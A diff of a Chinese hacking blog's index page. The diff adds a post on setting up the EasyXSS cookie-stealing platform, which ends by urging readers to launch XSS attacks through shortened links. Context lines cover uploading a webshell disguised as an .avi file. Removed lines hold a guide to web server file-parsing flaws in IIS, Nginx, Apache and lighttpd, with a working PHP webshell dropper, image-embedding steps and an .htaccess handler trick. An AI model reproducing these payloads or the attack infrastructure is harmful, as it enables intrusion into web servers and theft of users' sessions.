@@ -161,6 +161,68 @@ function dispatch() {
 
       <div class="body-wrap">
   
+    <article id="post-560" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2013/03/12/560/" class="article-date">
+  	<time datetime="2013-03-12T03:09:44.000Z" itemprop="datePublished">2013-03-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/03/12/560/">easyxss平台搭建</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div><span style="color: #ff0000;">bae上搭建easyxss</span>【如果不是bae，sae上就不需要】</div><br><div>@<a href="http://zone.wooyun.org/user/%E6%98%B5%E7%A7%B0" target="_blank" rel="external">昵称</a> 目测bae和sae都是要使用重写功能<br>bae  修改 app.conf<br>格式：<br>- url : /member/(.+)$<br>script : member.php?mid=$1</div><br><div></div><br><div>sae修改 config.yaml<br>格式：<br>- rewrite: if( path ~ “^feed$” ) goto “feed.php”</div><br><div></div><br><div>测试发现，bae上搭建不了。应该要修改thinkphp，所以使用phpcloud来搭建。</div><br><div></div><br><div></div><br><div><span style="color: #ff0000;"> App/Conf/config.php 配置文件</span></div><br><div></div><br><div>&lt;?php<br>return array(<br>‘DEFAULT_MODULE’     =&gt; ‘User’,<br>‘URL_MODEL’          =&gt; ‘0’, //这里改成0，原来是2，具体设置请参考THINKPHP配置说说明<br>‘SESSION_AUTO_START’ =&gt; true,<br>‘DB_DSN’ =&gt; ‘mysql://root:toor@127.0.0.1:3306/xss’, //数据库链接信息，用户名@密码，最后的是数据库名<br>‘DB<em>PREFIX’ =&gt; ‘xss</em>‘,<br>‘MAIL_ADDRESS’=&gt;’info@xss.tw’,<br>‘MAIL_SMTP’=&gt;’smtp.gmail.com’,<br>‘MAIL_LOGINNAME’=&gt;’info@xss.tw’,<br>‘MAIL_PASSWORD’=&gt;’’,<br>‘MAIL_SENDER’=&gt;’info’,<br>‘MAIL_PORT’=&gt;’465’,<br>‘TMPL_PARSE_STRING’ =&gt;array(<br>‘<strong>SITENAME</strong>‘ =&gt;’EasyXSS 1.0’,<br>‘<strong>SITETITLE</strong>‘=&gt;’EasyXSS’,<br>),<br>);<br>?&gt;</div><br><div></div><br><div><span style="color: #ff0000;">wwwroot目录是web根目录，wwwroot/index.php定义了framework与application的路径，你改了就要跟着改。</span></div><br><div></div><br><div>&lt;?php<br>define(‘APP_NAME’, ‘./XSS’);<br>define(‘APP_PATH’, ‘./../App/‘); //App那个文件夹的路径，改掉了就跟着改<br>define(‘APP_DEBUG’, true); //debug开关require ‘./../ThinkPHP/ThinkPHP.php’; //thinkphp framework 的路径?&gt;</div><br><div></div><br><div>data.sql导入数据库，这里不说了。</div><br><div></div><br><div></div><br><div>有一个邀请码：1234567890<br>请注册名字为：root的用户，才能生成邀请码</div><br><div></div><br><div>注册一个用户名为root的用户，</div><br><div>邀请码生成URL：/Key/createKey/count/1/type/1<br>count为数量，type为类型:0为自助申请，1为手动发放的邀请码，不被自助申请获得到</div><br><div><img src="file:///C:/Users/Daddy/AppData/Local/Temp/enhtmlclip/Image.png" alt=""></div><br><div>界面模仿xsser.me,PHP代码没参考任何其他平台，所以写得很烂。现在的新版本基本上重写，主要方面是用户权限控制，使用类的继承，方便多了。keepsession： 定期访问 /Xssresult/Keepsession 即可，或者定期执行Keepsession文件夹下的php脚本。</div><br><div></div><br><div><br><br>phpcloud申请账号，然后创建一个app。<br><br>然后会得到一个key，.ppt的这时候用winscp连上去。<br><br>，地址如下，很多都是你设置的容器的名字。<br><br>如下图<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/3.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/3.bmp" alt="3"></a><br><br>&nbsp;<br><br>然后将这个我修改好的easyxss平台代码丢上去，修改所有目录属性为777。不然会提示run error，因为没有写入权限。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/4.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/4.bmp" alt="4"></a><br><br>&nbsp;<br><br>然后修改conf文件，最好用notepad++修改好了再覆盖上去。不然会有其他的错误<br><br>Assuming your container name is <code>**_mycontainer_**</code>, you should use the following credentials to connect to your database:<br><br><em>   <strong>Database host:</strong><em>mycontainer</em>-db.my.phpcloud.com
+</em>   <strong>Database port:</strong> 3306<br><em>   <strong>Database schema name:</strong><em>mycontainer</em>
+</em>   <strong>Database user:</strong><em>mycontainer</em><br><em>   <em>*Database password:</em></em> your container password导入mysql数据库，可以使用phpadmin或者ssh的方式<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/5.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/5.bmp" alt="5"></a><br>我导入的是去掉iptables的，因为他这个ip表有20多m，不好上传。等我回寝室再导入把。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" alt="1(1)"></a><br><br>然后进入dnspod，把域名绑定以下。<br><br>&nbsp;<br><br>将域名cname到 <em>mycontainer</em>.my.phpcloud.com，就是你可以直接访问的地址。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/6.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/6.bmp" alt="6"></a> <a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" alt="1(1)"></a><br><br>现在就可以通过绑定的域名进行访问了。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/21.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/21.bmp" alt="2(1)"></a><br><br>&nbsp;<br><br>然后要注意的是phpcloud必须要每天登入一次来激活，这个可以使用我们的监控宝来完成<br><br></div><br><div><br><br>到此我们就完成平台搭建的所有工作，然后可以使用url缩短服务，尽情的xss去吧。<br><br></div><br><div></div>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/云/">云</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/Hack/">Hack</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+
+  
     <article id="post-542" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1200,85 +1262,6 @@ Page Views per Visit: ![](http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/
 <p>好了.我们新建一个 <a>www.asp</a> 文件夹.</p>
 <p>确定..我们的文件夹就建好了..然后点击进入该文件夹 (</p>
 <p>然后到了最关键的…我们上传文件..<br>用插入图片是上传不了的..他会检测是不是正常的图片..<br>可以试试 插入 FLASH<br>或者插入 视频 音乐文件..我们这里就插入视频.. 然后直接把 我们要传上去的马后缀改为 .avi形式<br>然后进入我们刚才新建的那个目录 然后上传 .. 文件就上去了</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/Hack/">Hack</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-
-  
-    <article id="post-370" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2013/02/07/370/" class="article-date">
-  	<time datetime="2013-02-07T11:07:38.000Z" itemprop="datePublished">2013-02-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2013/02/07/370/">各大Web服务器解析漏洞总结</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>各大Web服务器解析漏洞总结<br>From:90sec</p>
-<p>[+]IIS 6.0</p>
-<p>&nbsp;</p>
-<p><pre>目录解析：/xx.asp/xx.jpg  xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码 IIS6.0会将 xx.jpg 解析为 asp 文件。后缀解析：/xx.asp;.jpg     /xx.asp:.jpg(此处需抓包修改文件名) IIS6.0都会把此类后缀文件成功解析为 asp 文件。默认解析：/xx.asa    /xx.cer   /xx.cdx IIS6.0默认的可执行文件除了 asp 还包含这三种此处可联系利用目录解析漏洞/xx.asa/xx.jpg 或/xx.cer/xx.jpg 或 xx.asa;.jpg</pre><br>&nbsp;</p>
-<p>[+]IIS 7.0/IIS 7.5/Nginx &lt;8.03</p>
-<p>&nbsp;</p>
-<p><pre>IIS 7.0/IIS 7.5/Nginx&lt;8.03在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。常用利用方法：将一张图和一个写入后门代码的文本文件合并将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾  e.g.  copy xx.jpg/b + yy.txt/a xy.jpg ######################################/b 即二进制[binary]模式/a 即ascii模式 xx.jpg正常图片文件  yy.txt 内容&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;意思为写入一个内容为&lt;?php eval($_POST[cmd])?&gt;名称为shell.php的文件######################################找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上/xx.php 即可执行恶意文本。然后就在图片目录下生成一句话木马 shell.php 密码 cmd</pre><br>&nbsp;</p>
-<p>[+]Nginx &lt;8.03</p>
-<p>&nbsp;</p>
-<p><pre>在Fast-CGI关闭的情况下，Nginx&lt;8.03依然存在解析漏洞在一个文件路径(/xx.jpg)后面加上%00.php会将/xx.jpg%00.php解析为 php 文件。</pre><br>&nbsp;</p>
-<p>[+]Apache</p>
-<p>&nbsp;</p>
-<p><pre>后缀解析：test.php.x1.x2.x3  Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析  test.php.x1.x2.x3 则会被解析为php 经验之谈：php|php3|phtml 多可被Apache解析</pre><br>&nbsp;</p>
-<p>[+]其他一些可利用的</p>
-<p>&nbsp;</p>
-<p><pre>在windows环境下，xx.jpg[空格]或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！在向一台windows主机上传数据时，你可以抓包修改文件名，在后面加个空格或点，试图绕过黑名单，若上传成功，最后的点或空格都会被消除，这样就可得到shell。我记得FckPhp2.6就存在加空格绕过的漏洞。{Linux主机中不行，Linux允许这类文件存在}如果在Apache中.htaccess可被执行（默认不执行，这是90sec里的一位朋友说的，当初我并不知道），且可以被上传，那可以尝试在.htaccess中写入:&lt;FilesMatch“shell.jpg”&gt;SetHandler application/x-httpd-php &lt;/FilesMatch&gt; shell.jpg换成你上传的文件，这样shell.jpg就可解析为php文件</pre><br>&nbsp;</p>
-<p>[+]lighttpd</p>
-<p>&nbsp;</p>
-<p><pre>xx.jpg/xx.php  [Addby loser]</pre><br>&nbsp;</p>
 
       
     </div>
